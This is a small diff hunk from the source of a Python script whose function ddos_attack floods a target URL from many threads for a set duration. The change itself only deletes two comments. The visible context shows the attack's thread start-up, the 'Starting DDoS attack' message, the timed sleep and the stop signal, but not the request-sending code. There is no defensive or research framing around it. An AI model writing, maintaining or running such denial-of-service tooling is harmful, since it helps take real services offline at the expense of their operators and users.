@@ -21,10 +21,9 @@ def ddos_attack(target_url, request_count, duration=20):
         thread.start()
         threads.append(thread)
 
-    # Let the attack run for the specified duration (20 seconds)
     print(f"Starting DDoS attack on {target_url} for {duration} seconds...")
     time.sleep(duration)
-    stop_event.set()  # Signal all threads to stop after the duration
+    stop_event.set() 
 
     for thread in threads:
         thread.join()
